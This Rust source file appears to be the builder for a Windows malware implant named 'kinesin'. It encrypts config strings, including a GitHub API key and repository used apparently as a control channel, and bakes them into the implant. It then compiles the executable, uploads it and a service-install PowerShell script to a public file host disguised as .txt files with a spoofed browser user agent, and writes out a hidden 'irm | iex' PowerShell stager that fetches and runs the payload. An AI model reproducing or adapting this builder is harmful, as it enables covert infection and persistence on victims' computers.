mod utils;

use std::io::Write;
use std::process::Command;
use std::time::Duration;
use std::{env, process, io};
use std::fs::{self, File};
use std::path::PathBuf;

use reqwest::blocking::Client;
use reqwest::blocking::multipart::{Form, Part};
use reqwest::header::USER_AGENT;
use serde::Deserialize;
use json_comments::StripComments;

#[derive(Debug, Deserialize)]
struct Config {
    api_key: String,
    repo_name: String,
    repo_owner: String,

    service_name: String,
    service_file_name: String,
    kill_switch_file_name: String,
    log_file_name: String,
    base_directory: String
}

fn main() -> io::Result<()> {
    let args = env::args()
        .skip(1)
        .collect::<Vec<String>>();

    if args.len() <= 0 {
        eprintln!("you need to provide the path of the project directory");
        process::exit(1);
    }

    let project_path = PathBuf::from(args[0].to_string());
    if !project_path.exists() || !project_path.is_dir() {
        eprintln!("you need to provide the path of the project directory");
        process::exit(1);
    }

    println!("project directory - {}", project_path.display());

    let config_path = project_path.join("config.jsonc");
    if !config_path.exists() || !config_path.is_file() {
        eprintln!("failed to find config file");
        process::exit(1);
    }

    println!("config file - {}", config_path.display());

    let config_file = match File::open(config_path) {
        Ok(file) => file,
        Err(err) => {
            eprintln!("failed to open config file - {}", err);
            process::exit(1);
        }
    };

    let stripped = StripComments::new(config_file);

    let config = match serde_json::from_reader::<_, Config>(stripped) {
        Ok(data) => data,
        Err(err) => {
            eprintln!("failed to parse config - {}", err);
            process::exit(1);
        }
    };

    if has_empty(&config) {
        eprintln!("1 or more config options is empty");
        process::exit(1);
    }

    let encryption_key_str = lib::random::gen_string(100);
    let kill_switch_str = lib::random::gen_string(100);
    let build_id_str = lib::random::gen_string(11);

    let encryption_key = lib::hash::sha256(encryption_key_str.as_bytes(), &[]);
    utils::set_key(&encryption_key);

    let build_id = utils::encrypt(&build_id_str);
    let api_key = utils::encrypt(&config.api_key);
    let repo_name = utils::encrypt(&config.repo_name);
    let repo_owner = utils::encrypt(&config.repo_owner);
    let service_name = utils::encrypt(&config.service_name);
    let kill_switch_file_name = utils::encrypt(&config.kill_switch_file_name);
    let log_file_name = utils::encrypt(&config.log_file_name);
    let base_directory = utils::encrypt(&config.base_directory);

    let kill_switch_hash = lib::hash::sha256(kill_switch_str.as_bytes(), &encryption_key);

    let kinesin_config_path = project_path.join("main\\src\\config.rs");
    if !kinesin_config_path.exists() || !kinesin_config_path.is_file() {
        eprintln!("failed to find kinesin config file");
        process::exit(1);
    }

    println!("kinesin config file - {}", kinesin_config_path.display());

    let mut config_replace = fs::read_to_string(&kinesin_config_path)?;
    utils::edit_array(&mut config_replace, "SERVICE_NAME", &service_name);
    utils::edit_array(&mut config_replace, "LOG_FILE_NAME", &log_file_name);
    utils::edit_array(&mut config_replace, "BASE_DIR_PATH", &base_directory);
    utils::edit_array(&mut config_replace, "CRYPTO_KEY", &encryption_key);
    utils::edit_array(&mut config_replace, "KILL_SWITCH_FILE_NAME", &kill_switch_file_name);
    utils::edit_array(&mut config_replace, "KILL_SWITCH_HASH", &kill_switch_hash);
    utils::edit_array(&mut config_replace, "GITHUB_API_KEY", &api_key);
    utils::edit_array(&mut config_replace, "GITHUB_REPO", &repo_name);
    utils::edit_array(&mut config_replace, "GITHUB_OWNER", &repo_owner);
    utils::edit_array(&mut config_replace, "BUILD_ID", &build_id);

    fs::write(&kinesin_config_path, config_replace)?;

    println!("updated config");

    let main_path = project_path.join("main");
    if !main_path.exists() || !main_path.is_dir() {
        eprintln!("failed to find main directory {}", main_path.display());
        process::exit(1);
    }

    println!("main directory - {}", main_path.display());

    let status = Command::new("cargo.exe")
        .current_dir(&main_path)
        .arg("build")
        .arg("--release")
        .arg("--target")
        .arg("x86_64-pc-windows-msvc")
        .status()?;

    if !status.success() {
        eprintln!("failed to compile main file");
        process::exit(1);
    }

    println!("main built");

    let main_file_path = main_path.join("target\\x86_64-pc-windows-msvc\\release\\main.exe");
    if !main_file_path.exists() || !main_file_path.is_file() {
        eprintln!("failed to find main file");
        process::exit(1);
    }

    let main_url = upload_file(&main_file_path);
    if main_url == "" {
        eprintln!("failed to upload main file");
        process::exit(1);
    }

    println!("main file uploaded");

    let script_path = project_path.join("builder\\templates\\start-service.ps1");
    if !script_path.exists() || !script_path.is_file() {
        eprintln!("failed to find start service script");
        process::exit(1);
    }

    let mut start_script = fs::read_to_string(&script_path)?;
    utils::replace_str(&mut start_script, "BASE_DIR", &config.base_directory);
    utils::replace_str(&mut start_script, "SERVICE_FILE_NAME", &config.service_file_name);
    utils::replace_str(&mut start_script, "MAIN_FILE_URL", &main_url);
    utils::replace_str(&mut start_script, "SERVICE_NAME", &config.service_name);

    let temp_script = env::temp_dir()
        .join(lib::random::gen_string(7));

    fs::write(&temp_script, &start_script)?;

    let script_url = upload_file(&temp_script);
    if script_url == "" {
        eprintln!("failed to upload script");
        process::exit(1);
    }

    println!("script uploaded");

    let builds_path = project_path.join("_build");
    if !script_path.exists() {
        fs::create_dir(&builds_path)?;
    }

    let build_data_file_name = builds_path
        .join(format!("{}.txt", build_id_str));

    let mut build_data_file = File::create(&build_data_file_name)?;
    build_data_file.write_all(format!("powershell.exe -nop -ep Bypass -w Hidden -C \"irm {} | iex\"\n", script_url).as_bytes())?;
    build_data_file.write_all("\n".as_bytes())?;
    build_data_file.write_all("=============================================================================================\n".as_bytes())?;
    build_data_file.write_all("=============================================================================================\n".as_bytes())?;
    build_data_file.write_all("\n".as_bytes())?;
    build_data_file.write_all(format!("encryption key: {}\n", encryption_key_str).as_bytes())?;
    build_data_file.write_all(format!("kill switch: {}\n", kill_switch_str).as_bytes())?;
    build_data_file.write_all("\n".as_bytes())?;
    build_data_file.write_all(format!("main: {}\n", main_url).as_bytes())?;
    build_data_file.write_all(format!("script: {}\n", script_url).as_bytes())?;
    build_data_file.write_all("\n".as_bytes())?;
    build_data_file.write_all(format!("{:#?}", config).as_bytes())?;

    println!("build done - {}", build_data_file_name.display());

    Ok(())
}

fn upload_file(file: &PathBuf) -> String {
    let old_dir = file
        .parent()
        .unwrap();

    let file_name = lib::random::gen_string(7);

    let new_file = old_dir
        .join(&file_name);

    fs::rename(file, &new_file)
        .unwrap();

    let data = fs::read(&new_file)
        .unwrap();

    let parts = Part::bytes(data)
        .file_name(format!("{}.txt", file_name))
        .mime_str("text/plain")
        .unwrap();

    let form = Form::new()
        .text("reqtype", "fileupload")
        .part("fileToUpload", parts);

    let client = Client::new();

    let upload = client
        .post("https://catbox.moe/user/api.php")
        .header(USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
        .timeout(Duration::from_secs(270))
        .multipart(form)
        .send()
        .unwrap();

    if !upload.status().is_success() {
        return "".to_string();
    }

    let text = upload
        .text()
        .unwrap();

    if !text.starts_with("https://") {
        return "".to_string();
    }

    text
}

fn has_empty(config: &Config) -> bool {
    config.api_key.trim().is_empty()
        || config.repo_name.trim().is_empty()
        || config.repo_owner.trim().is_empty()
        || config.service_name.trim().is_empty()
        || config.service_file_name.trim().is_empty()
        || config.kill_switch_file_name.trim().is_empty()
        || config.log_file_name.trim().is_empty()
        || config.base_directory.trim().is_empty()
}